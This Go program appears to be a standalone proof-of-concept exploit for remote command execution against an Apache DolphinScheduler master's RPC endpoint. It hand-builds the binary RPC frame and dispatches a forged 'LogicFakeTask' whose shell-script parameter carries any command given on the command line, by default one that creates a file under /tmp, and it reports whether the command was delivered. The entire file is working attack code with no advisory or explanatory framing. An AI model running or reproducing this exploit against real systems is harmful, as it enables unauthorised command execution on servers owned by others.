package main

import (
    "bytes"
    "encoding/base64"
    "encoding/binary"
    "encoding/json"
    "flag"
    "fmt"
    "net"
    "os"
    "time"
)

const (
    methodIdentifier       = "public abstract org.apache.dolphinscheduler.task.executor.operations.TaskExecutorDispatchResponse org.apache.dolphinscheduler.extract.master.ILogicTaskExecutorOperator.dispatchTask(org.apache.dolphinscheduler.task.executor.operations.TaskExecutorDispatchRequest)"
    argsTypeDispatchRequest = "org.apache.dolphinscheduler.task.executor.operations.TaskExecutorDispatchRequest"
    rpcMagic                = byte(0xbe)
    rpcVersion              = byte(0x00)
    defaultWorkflowCode     = int64(999999)
)

type standardRpcRequest struct {
    Args     []string `json:"args"`
    ArgsType []string `json:"argsTypes"`
}

type standardRpcResponse struct {
    Success  bool   `json:"success"`
    Message  string `json:"message"`
    Body     string `json:"body"`
    BodyType string `json:"bodyType"`
}

type taskExecutorDispatchResponse struct {
    DispatchSuccess bool   `json:"dispatchSuccess"`
    Message         string `json:"message"`
}

type taskExecutorDispatchRequest struct {
    TaskExecutionContext taskExecutionContext `json:"taskExecutionContext"`
}

type taskExecutionContext struct {
    TaskInstanceID            int    `json:"taskInstanceId"`
    TaskName                  string `json:"taskName"`
    FirstSubmitTime           int64  `json:"firstSubmitTime"`
    StartTime                 int64  `json:"startTime"`
    TaskType                  string `json:"taskType"`
    WorkflowInstanceHost      string `json:"workflowInstanceHost"`
    ProcessID                 int    `json:"processId"`
    WorkflowDefinitionCode    int64  `json:"workflowDefinitionCode"`
    WorkflowDefinitionVersion int    `json:"workflowDefinitionVersion"`
    WorkflowInstanceID        int    `json:"workflowInstanceId"`
    ScheduleTime              int    `json:"scheduleTime"`
    GlobalParams              string `json:"globalParams"`
    ExecutorID                int    `json:"executorId"`
    TenantCode                string `json:"tenantCode"`
    WorkflowDefinitionID      int    `json:"workflowDefinitionId"`
    TaskParams                string `json:"taskParams"`
    TaskTimeoutStrategy       string `json:"taskTimeoutStrategy"`
    TaskTimeout               int    `json:"taskTimeout"`
    EndTime                   int    `json:"endTime"`
    DryRun                    int    `json:"dryRun"`
    DispatchFailTimes         int    `json:"dispatchFailTimes"`
    Failover                  bool   `json:"failover"`
}

func main() {
    target := flag.String("target", "127.0.0.1:5678", "Master RPC endpoint in the format host:port")
    command := flag.String("cmd", "touch /tmp/master_rpc_rce_go", "Command to execute on the master host")
    timeout := flag.Duration("timeout", 5*time.Second, "Network timeout")
    flag.Parse()

    payload, err := buildRpcPayload(*command)
    if err != nil {
        fmt.Fprintf(os.Stderr, "[!] Failed to build RPC payload: %v\n", err)
        os.Exit(1)
    }

    conn, err := net.DialTimeout("tcp", *target, *timeout)
    if err != nil {
        fmt.Fprintf(os.Stderr, "[!] Unable to connect to %s: %v\n", *target, err)
        os.Exit(1)
    }
    defer conn.Close()
    _ = conn.SetDeadline(time.Now().Add(*timeout))

    if _, err := conn.Write(payload); err != nil {
        fmt.Fprintf(os.Stderr, "[!] Failed to send RPC payload: %v\n", err)
        os.Exit(1)
    }

    resp, err := readRpcResponse(conn)
    if err != nil {
        fmt.Fprintf(os.Stderr, "[!] Failed to read RPC response: %v\n", err)
        os.Exit(1)
    }

    if !resp.Success {
        fmt.Fprintf(os.Stderr, "[!] RPC call was rejected: %s\n", resp.Message)
        os.Exit(1)
    }

    decoded, err := base64.StdEncoding.DecodeString(resp.Body)
    if err != nil {
        fmt.Fprintf(os.Stderr, "[!] Failed to decode response body: %v\n", err)
        os.Exit(1)
    }

    var dispatch taskExecutorDispatchResponse
    if err := json.Unmarshal(decoded, &dispatch); err != nil {
        fmt.Fprintf(os.Stderr, "[!] Failed to parse TaskExecutorDispatchResponse: %v\n", err)
        os.Exit(1)
    }

    if dispatch.DispatchSuccess {
        fmt.Printf("[+] LogicFakeTask dispatched successfully, command delivered: %s\n", *command)
    } else {
        fmt.Printf("[!] Task dispatch failed: %s\n", dispatch.Message)
    }
}

func buildRpcPayload(command string) ([]byte, error) {
    now := time.Now()
    taskParamsMap := map[string]string{
        "shellScript": command,
    }
    taskParamsBytes, err := json.Marshal(taskParamsMap)
    if err != nil {
        return nil, fmt.Errorf("marshal taskParams: %w", err)
    }

    ctx := taskExecutionContext{
        TaskInstanceID:            int(now.Unix()),
        TaskName:                  "logic_fake_rpc_poc",
        FirstSubmitTime:           now.UnixMilli(),
        StartTime:                 now.UnixMilli(),
        TaskType:                  "LogicFakeTask",
        WorkflowInstanceHost:      "127.0.0.1:5678",
        ProcessID:                 0,
        WorkflowDefinitionCode:    defaultWorkflowCode,
        WorkflowDefinitionVersion: 1,
        WorkflowInstanceID:        0,
        ScheduleTime:              0,
        GlobalParams:              "[]",
        ExecutorID:                0,
        TenantCode:                "root",
        WorkflowDefinitionID:      0,
        TaskParams:                string(taskParamsBytes),
        TaskTimeoutStrategy:       "WARN",
        TaskTimeout:               0,
        EndTime:                   0,
        DryRun:                    0,
        DispatchFailTimes:         0,
        Failover:                  false,
    }

    request := taskExecutorDispatchRequest{TaskExecutionContext: ctx}
    requestBytes, err := json.Marshal(request)
    if err != nil {
        return nil, fmt.Errorf("marshal TaskExecutorDispatchRequest: %w", err)
    }

    stdReq := standardRpcRequest{
        Args:     []string{base64.StdEncoding.EncodeToString(requestBytes)},
        ArgsType: []string{argsTypeDispatchRequest},
    }
    bodyBytes, err := json.Marshal(stdReq)
    if err != nil {
        return nil, fmt.Errorf("marshal StandardRpcRequest: %w", err)
    }

    header := map[string]interface{}{
        "methodIdentifier": methodIdentifier,
        "opaque":          time.Now().UnixNano(),
    }
    headerBytes, err := json.Marshal(header)
    if err != nil {
        return nil, fmt.Errorf("marshal header: %w", err)
    }

    buf := bytes.NewBuffer(nil)
    buf.WriteByte(rpcMagic)
    buf.WriteByte(rpcVersion)
    if err := binary.Write(buf, binary.BigEndian, uint32(len(headerBytes))); err != nil {
        return nil, err
    }
    buf.Write(headerBytes)
    if err := binary.Write(buf, binary.BigEndian, uint32(len(bodyBytes))); err != nil {
        return nil, err
    }
    buf.Write(bodyBytes)
    return buf.Bytes(), nil
}

func readRpcResponse(conn net.Conn) (*standardRpcResponse, error) {
    header := make([]byte, 2)
    if _, err := ioReadFull(conn, header); err != nil {
        return nil, err
    }
    if header[0] != rpcMagic || header[1] != rpcVersion {
        return nil, fmt.Errorf("unexpected magic/version: %x %x", header[0], header[1])
    }

    var headerLen uint32
    if err := binary.Read(conn, binary.BigEndian, &headerLen); err != nil {
        return nil, err
    }
    headerBytes := make([]byte, headerLen)
    if _, err := ioReadFull(conn, headerBytes); err != nil {
        return nil, err
    }

    var bodyLen uint32
    if err := binary.Read(conn, binary.BigEndian, &bodyLen); err != nil {
        return nil, err
    }
    bodyBytes := make([]byte, bodyLen)
    if _, err := ioReadFull(conn, bodyBytes); err != nil {
        return nil, err
    }

    var resp standardRpcResponse
    if err := json.Unmarshal(bodyBytes, &resp); err != nil {
        return nil, err
    }
    return &resp, nil
}

func ioReadFull(conn net.Conn, buf []byte) (int, error) {
    total := 0
    for total < len(buf) {
        n, err := conn.Read(buf[total:])
        if err != nil {
            return total, err
        }
        total += n
    }
    return total, nil
}
